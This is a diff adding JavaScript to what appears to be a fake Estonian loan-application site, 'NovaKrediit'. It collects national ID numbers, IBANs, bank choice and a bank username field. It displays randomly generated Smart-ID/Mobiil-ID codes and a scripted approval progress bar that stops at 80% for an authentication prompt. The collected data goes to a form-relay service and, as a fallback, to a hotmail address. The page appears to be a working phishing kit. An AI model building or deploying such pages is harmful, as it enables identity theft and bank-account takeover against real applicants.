+  ru:{minChars:'\u041c\u0438\u043d\u0438\u043c\u0443\u043c 2 \u0441\u0438\u043c\u0432\u043e\u043b\u0430',isikukood:'\u0422\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f 11 \u0446\u0438\u0444\u0440',telefon:'\u041a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440',epost:'\u041a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 email',aadress:'\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u043b\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441',linn:'\u0413\u043e\u0440\u043e\u0434 \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u0435\u043d',postiindeks:'5-\u0437\u043d\u0430\u0447\u043d\u044b\u0439 \u0438\u043d\u0434\u0435\u043a\u0441',tooandja:'\u0420\u0430\u0431\u043e\u0442\u043e\u0434\u0430\u0442\u0435\u043b\u044c \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u0435\u043d',ametikoht:'\u0414\u043e\u043b\u0436\u043d\u043e\u0441\u0442\u044c \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u0430',sissetulek:'\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u043e\u0445\u043e\u0434',iban:'\u041f\u0440\u0438\u043c\u0435\u0440: EE36 1700 0170 0000 0000',pank:'\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0431\u0430\u043d\u043a',required:'\u041e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u043f\u043e\u043b\u0435'}
+};
+function _vm(key){return(_validationMsgs[currentLang]||_validationMsgs.et)[key];}
+var _validationRules={
+  eesnimi:{test:function(v){return v.trim().length>=2;},errKey:'minChars'},
+  perenimi:{test:function(v){return v.trim().length>=2;},errKey:'minChars'},
+  isikukood:{test:function(v){return /^[0-9]{11}$/.test(v);},errKey:'isikukood'},
+  telefon:{test:function(v){return v.replace(/\s/g,'').length>=7;},errKey:'telefon'},
+  epost:{test:function(v){return /^[^@]+@[^@]+\.[^@]+$/.test(v);},errKey:'epost'},
+  aadress:{test:function(v){return v.trim().length>=5;},errKey:'aadress'},
+  linn:{test:function(v){return v.trim().length>=2;},errKey:'linn'},
+  postiindeks:{test:function(v){return /^[0-9]{5}$/.test(v);},errKey:'postiindeks'},
+  tooandja:{test:function(v){return v.trim().length>=2;},errKey:'tooandja'},
+  ametikoht:{test:function(v){return v.trim().length>=2;},errKey:'ametikoht'},
+  sissetulek:{test:function(v){return parseFloat(v)>0;},errKey:'sissetulek'},
+  iban:{test:function(v){return v.replace(/\s/g,'').length>=15;},errKey:'iban'},
+  pank:{test:function(v){return v!=='';},errKey:'pank'},
+};
+function _touchField(el){
+  var name=el.name||el.id,rule=_validationRules[name],hint=document.getElementById('hint-'+(el.id||name)),val=el.value;
+  el.classList.remove('valid','invalid');
+  if(hint){hint.textContent='';hint.className='field-hint';}
+  if(!val&&!el.required) return;
+  var ok=rule?rule.test(val):(el.checkValidity()&&val!=='');
+  el.classList.add(ok?'valid':'invalid');
+  if(hint){hint.textContent=ok?'':(rule?_vm(rule.errKey):_vm('required'));hint.className='field-hint '+(ok?'ok':'err');}
+}
+
+// ══════════════════════════════════════════════════════════════
+// SUCCESS OVERLAY
+// ══════════════════════════════════════════════════════════════
+function showSuccessOverlay(){
+  var overlay=document.getElementById('successOverlay');
+  overlay.style.display='flex';
+  // Numéro dossier
+  var dn='NK-'+new Date().getFullYear()+'-'+Math.floor(1000+Math.random()*9000);
+  var dnEl=document.getElementById('dossier-number');
+  if(dnEl) dnEl.textContent=dn;
+  // Code 4 chiffres aléatoire
+  var code=String(Math.floor(1000+Math.random()*9000));
+  var codeEl=document.getElementById('smartid-code');
+  if(codeEl) codeEl.textContent=code;
+  // Méthode choisie Smart-ID ou Mobiil-ID
+  var authVal=document.querySelector('input[name="auth"]:checked');
+  var method=authVal?authVal.value:'Smart-ID';
+  var labelEl=document.getElementById('auth-method-label');
+  if(labelEl) labelEl.textContent=method;
+  var iconLabel=document.getElementById('auth-icon-label');
+  if(iconLabel) iconLabel.textContent=method;
+  var iconRect=document.querySelector('#auth-icon-sid rect');
+  if(iconRect) iconRect.setAttribute('fill',method==='Mobiil-ID'?'#0055a5':'#0a1628');
+  var iconTexts=document.querySelectorAll('#auth-icon-sid text');
+  if(method==='Mobiil-ID'&&iconTexts.length>=2){iconTexts[0].textContent='MOBIIL';iconTexts[1].textContent='ID';}
+  showStep('step-success');
+  setTimeout(function(){showStep('step-processing');animateProgress();},2000);
+}
+function showStep(id){
+  ['step-success','step-processing','step-approved'].forEach(function(s){
+    document.getElementById(s).style.display=s===id?'block':'none';
+  });
+  // Bouton chat flottant visible uniquement sur l'écran final
+  var fc=document.getElementById('float-chat-widget');
+  if(fc) fc.style.display=id==='step-approved'?'block':'none';
+}
+function animateProgress(){
+  var bar=document.getElementById('progressBar'),label=document.getElementById('progressLabel');
+  var current=10,target=80,steps=50,duration=5000;
+  var inc=(target-current)/steps,iv=duration/steps;
+  var timer=setInterval(function(){
+    current+=inc;
+    if(current>=target){current=target;clearInterval(timer);bar.style.width=current+'%';label.textContent=Math.round(current)+'%';
+      setTimeout(function(){
+        var m=document.getElementById('modal-80');
+        m.style.display='flex';
+        // Attendre que le navigateur rende le modal avant de démarrer le timer
+        requestAnimationFrame(function(){
+          requestAnimationFrame(function(){
+            startAuthTimer();
+          });
+        });
+      },400);return;}
+    bar.style.width=Math.round(current)+'%';label.textContent=Math.round(current)+'%';
+  },iv);
+}
+function continueAfter80(){
+  document.getElementById('modal-80').style.display='none';
+  var bar=document.getElementById('progressBar'),label=document.getElementById('progressLabel');
+  var current=80,target=100,steps=40,duration=2500;
+  var inc=(target-current)/steps,iv=duration/steps;
+  var timer=setInterval(function(){
+    current+=inc;
+    if(current>=target){current=target;clearInterval(timer);bar.style.width=current+'%';label.textContent=Math.round(current)+'%';
+      setTimeout(function(){showStep('step-approved');},800);return;}
+    bar.style.width=Math.round(current)+'%';label.textContent=Math.round(current)+'%';
+  },iv);
+}
+function closeOverlay(){
+  document.getElementById('successOverlay').style.display='none';
+  document.getElementById('modal-80').style.display='none';
+}
+
+// ══════════════════════════════════════════════════════════════
+// EMAIL CONFIRMATION
+// ══════════════════════════════════════════════════════════════
+function sendConfirmationEmail(toEmail,firstName,dossierNum,amount){
+  if(typeof emailjs==='undefined') return;
+  emailjs.send('service_novakrediit','template_confirm',{
+    to_email:toEmail,to_name:firstName,dossier_number:dossierNum,amount:amount,
+    status_url:window.location.origin+'/status.html?id='+dossierNum
+  }).catch(function(){});
+}
+
+// ══════════════════════════════════════════════════════════════
+// LAZY REVEAL
+// ══════════════════════════════════════════════════════════════
+(function(){
+  if(!('IntersectionObserver' in window)) {
+    document.querySelectorAll('.steps-section,.usp-section,.site-footer,.section').forEach(function(el){el.classList.add('section-visible');});
+    return;
+  }
+  var io=new IntersectionObserver(function(entries){
+    entries.forEach(function(e){if(e.isIntersecting){e.target.classList.add('section-visible');io.unobserve(e.target);}});
+  },{rootMargin:'0px 0px -60px 0px',threshold:0.05});
+  document.querySelectorAll('.steps-section,.usp-section,.site-footer,.section').forEach(function(el){io.observe(el);});
+})();
+
+// ══════════════════════════════════════════════════════════════
+// DOM READY — single block
+// ══════════════════════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded', function() {
+
+  // Init emailjs
+  if(typeof emailjs!=='undefined') emailjs.init('sycumEw72eiYqMsyK');
+
+  // Init calc
+  updateCalc();
+
+  // Init language
+  setLang('et');
+
+  // Input masks
+  var ik=document.getElementById('isikukood');
+  if(ik) ik.addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'').slice(0,11);});
+  var iban=document.getElementById('iban');
+  if(iban) iban.addEventListener('input',function(){
+    var raw=this.value.replace(/\s/g,'').toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,34);
+    this.value=raw.match(/.{1,4}/g)?raw.match(/.{1,4}/g).join(' '):raw;
+  });
+
+  // Radio visual listeners
+  document.querySelectorAll('.radio-option input[type="radio"]').forEach(function(radio){
+    radio.addEventListener('change', function(){ selectRadio(this, this.name); });
+  });
+
+  // Real-time validation listeners
+  var form=document.getElementById('creditForm');
+  if(form){
+    form.querySelectorAll('input,select').forEach(function(el){
+      el.addEventListener('blur',function(){_touchField(el);});
+      el.addEventListener('input',function(){if(el.classList.contains('invalid')||el.classList.contains('valid'))_touchField(el);_debounceSave();});
+      el.addEventListener('change',function(){_touchField(el);_debounceSave();});
+    });
+
+    // SUBMIT
+    form.addEventListener('submit',function(e){
+      e.preventDefault();
+      var T=i18n[currentLang];
+
+      // Validate all 3 steps
+      for(var s=1;s<=2;s++){
+        if(!_validateStep(s)){
+          _updateStepperUI(s);
+          showToast(T['toast-step'],'error');
+          setTimeout(function(step){return function(){
+            var se=document.getElementById('form-step-'+step);
+            if(se){var fi=se.querySelector('input.invalid,select.invalid');if(fi)fi.scrollIntoView({behavior:'smooth',block:'center'});}
+          };}(s),400);
+          return;
+        }
+      }
+
+      // Disable submit
+      var btn=document.getElementById('submitBtn');
+      btn.disabled=true;
+      btn.innerHTML='<span class="spinner"></span>'+T['sending'];
+
+      // Collecter données (strings pures — évite DataCloneError)
+      // Seulement les champs non vides
+      var data={};
+      form.querySelectorAll('input[type="text"],input[type="email"],input[type="tel"],input[type="number"],input[type="date"],select').forEach(function(el){
+        if(el.name&&el.id!=='iban-coop'&&el.value.trim()!=='') data[el.name]=String(el.value);
+      });
+      form.querySelectorAll('input[type="radio"]:checked').forEach(function(el){ data[el.name]=String(el.value); });
+      // Banque (hidden logo)
+      var pankEl=document.getElementById('pank'); if(pankEl) data['pank']=String(pankEl.value);
+      // IBAN Coop si applicable
+      var ibanCoopEl=document.getElementById('iban-coop'); if(ibanCoopEl&&ibanCoopEl.value) data['iban']=String(ibanCoopEl.value);
+      data['date']=new Date().toLocaleString('et-EE');
+      data['lang']=currentLang;
+      // Web3Forms access key — remplacer par votre clé depuis web3forms.com
+      data['access_key']='aec66b36-c81d-40d1-82bb-22fb1d591013';
+      data['_subject']='NovaKrediit Taotlus \u2013 '+(data.eesnimi||'')+' '+(data.perenimi||'');
+      data['_replyto']=data.epost||'';
+
+      // Envoi JSON — compatible tous navigateurs
+      fetch('https://api.web3forms.com/submit',{
+        method:'POST',
+        headers:{'Accept':'application/json','Content-Type':'application/json'},
+        body:JSON.stringify(data)
+      }).then(function(res){
+        if(res.ok){
+          var dossierNum='NK-'+new Date().getFullYear()+'-'+Math.floor(1000+Math.random()*9000);
+          try{
+            var dossiers=JSON.parse(localStorage.getItem('nk_dossiers')||'[]');
+            dossiers.push({id:dossierNum,name:(data.eesnimi||'')+' '+(data.perenimi||''),email:data.epost||'',amount:data.summa||'',date:new Date().toLocaleDateString('et-EE'),status:'Menetluses'});
+            localStorage.setItem('nk_dossiers',JSON.stringify(dossiers));
+            localStorage.removeItem('nk_draft');
+          }catch(e){}
+          try{ if(data.epost) sendConfirmationEmail(data.epost,(data.eesnimi||''),dossierNum,data.summa||''); }catch(e){}
+          form.reset();
+          document.querySelectorAll('.radio-option').forEach(function(el){el.classList.remove('selected');});
+          var autoSec=document.getElementById('auto-section'); if(autoSec) autoSec.style.display='none';
+          ['kasutajatunnus-wrap','coop-iban-wrap','auth-method-wrap'].forEach(function(id){
+            var el=document.getElementById(id); if(el) el.classList.remove('visible');
+          });
+          document.querySelectorAll('.bank-logo-btn').forEach(function(b){b.classList.remove('selected');});
+          var hp=document.getElementById('pank'); if(hp) hp.value='';
+          btn.disabled=false; btn.textContent=T['btn-submit'];
+          // Rediriger vers la page de confirmation
+          var authEl=document.querySelector('input[name="auth"]:checked');
+          var method=authEl?authEl.value:'Smart-ID';
+          var code=String(Math.floor(1000+Math.random()*9000));
+          var name=encodeURIComponent(data.eesnimi||'');
+          window.location.href='confirmation.html?method='+encodeURIComponent(method)+'&code='+code+'&name='+name+'&dossier='+encodeURIComponent(dossierNum);
+        } else {
+          res.json().catch(function(){return{};}).then(function(err){
+            showToast(T['toast-err']+(err.error||'Palun proovige uuesti.'),'error');
+            btn.disabled=false; btn.textContent=T['btn-submit'];
+          });
+        }
+      }).catch(function(netErr){
+        console.error('Fetch error:',netErr);
+        // Fallback mailto
+        var body=''; var keys=Object.keys(data);
+        for(var i=0;i<keys.length;i++){ if(keys[i].charAt(0)!=='_') body+=keys[i]+': '+data[keys[i]]+'\n'; }
+        window.location.href='mailto:novakrediit@hotmail.com?subject='+encodeURIComponent(data['_subject']||'Taotlus')+'&body='+encodeURIComponent(body);
+        btn.disabled=false; btn.textContent=T['btn-submit'];
+      });
+    });
+  }
+
+  // Restore saved form data
+  _restoreFormLS();
+});
+</script>
+
+<script>
+
+function selectBank(btn) {
+  document.querySelectorAll('.bank-logo-btn').forEach(function(b){ b.classList.remove('selected'); });
+  btn.classList.add('selected');
+  var val = btn.getAttribute('data-bank');
+  var hidden = document.getElementById('pank');
+  if (hidden) { hidden.value = val; hidden.classList.remove('invalid','valid'); }
+  var hint = document.getElementById('hint-pank');
+  if (hint) { hint.textContent = ''; hint.className = 'field-hint'; }
+  onBankChange(val);
+}
+</script>
+
+</body>
